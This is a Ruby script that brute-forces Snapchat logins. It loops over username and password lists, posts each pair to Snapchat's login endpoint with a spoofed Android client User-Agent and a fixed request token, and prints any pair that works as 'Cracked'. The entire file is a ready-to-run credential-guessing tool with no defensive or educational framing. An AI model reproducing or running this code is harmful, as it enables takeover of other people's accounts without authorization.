require 'uri'
require 'net/http'
require 'net/https'
usernames = File.readlines("u.txt") # List Of Usernames
passwords = File.readlines("p.txt") # List Of Passwords
for username in usernames
	for password in passwords
		###################################
		uri = URI.parse("https://app.snapchat.com/loq/login")
		https = Net::HTTP.new(uri.host,uri.port)
		https.use_ssl = true
		req = Net::HTTP::Post.new(uri.path, initheader = {
			'Accept-Language' => 'en;q=0.9',
			'User-Agent' => 'Snapchat/8.8.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
		})
		req.body = "password=#{password}&req_token=9304d151ced17c086eed4ae4ffa57304c7e64d821980ca8b69b43b14ddc5188b&timestamp=1509567052943&username=#{username}"
		res = https.request(req)
		###################################
		if res.code.include? "200"
			if res.body.include? "Thanks!"
				puts "\n-----\nCracked -> (#{username}:#{password})\n-----\n"
			else
				if res.body.include? "password is incorrect"
					puts "Failed -> (""#{username}:#{password}"")\n"
				else
					if res.body.include? "Invalid account"
						puts "Invalid Account -> (#{username})\n"
					else
						puts "#{res.body}\n"
					end
				end
			end
		else
			puts "Shit ~~\n"
		end
	end
end
